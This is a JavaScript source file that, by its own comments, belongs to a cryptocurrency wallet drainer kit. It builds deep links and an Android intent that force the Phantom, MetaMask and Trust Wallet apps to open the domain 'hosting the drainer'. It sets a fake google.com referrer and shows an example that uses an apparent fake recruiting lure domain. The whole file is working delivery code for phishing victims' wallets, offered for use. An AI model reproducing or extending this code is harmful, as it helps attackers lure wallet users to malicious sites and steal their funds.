// J/utils/deeplink_factory.js
// THE DEEP LINK GENERATOR: Mobile Wallet Injection
// Generates URI schemes that force-open specific wallet apps to a target URL.

export class DeepLinkFactory {
    constructor(targetDomain) {
        this.target = targetDomain; // The domain hosting the drainer
    }

    // 1. PHANTOM (Solana)
    // Forces Phantom browser to open the target.
    // Ref: phantom.app/ul/browse
    getPhantomLink() {
        const encoded = encodeURIComponent(this.target);
        const ref = encodeURIComponent("https://google.com"); // Fake referrer
        return `https://phantom.app/ul/browse/${encoded}?ref=${ref}`;
    }

    // 2. METAMASK (EVM)
    // Forces Metamask Mobile to open the DApp.
    // Ref: metamask.app.link
    getMetamaskLink() {
        const cleanTarget = this.target.replace('https://', '').replace('http://', '');
        return `https://metamask.app.link/dapp/${cleanTarget}`;
    }

    // 3. TRUST WALLET (Multi-Chain)
    // Forces Trust Wallet browser.
    getTrustWalletLink(chainId = 60) { // 60 = ETH
        const encoded = encodeURIComponent(this.target);
        return `https://link.trustwallet.com/open_url?coin_id=${chainId}&url=${encoded}`;
    }

    // 4. UNIVERSAL INTENT (Android)
    // Tries to force any web3 browser via Intent
    getAndroidIntent() {
        const encoded = encodeURIComponent(this.target);
        return `intent://browse/${encoded}#Intent;scheme=https;package=io.metamask;end`;
    }
}

// Example Usage
const factory = new DeepLinkFactory("https://aether-labs-recruit.io");
console.log("[HYDRA] Phantom Link:", factory.getPhantomLink());
console.log("[HYDRA] MM Link:", factory.getMetamaskLink());
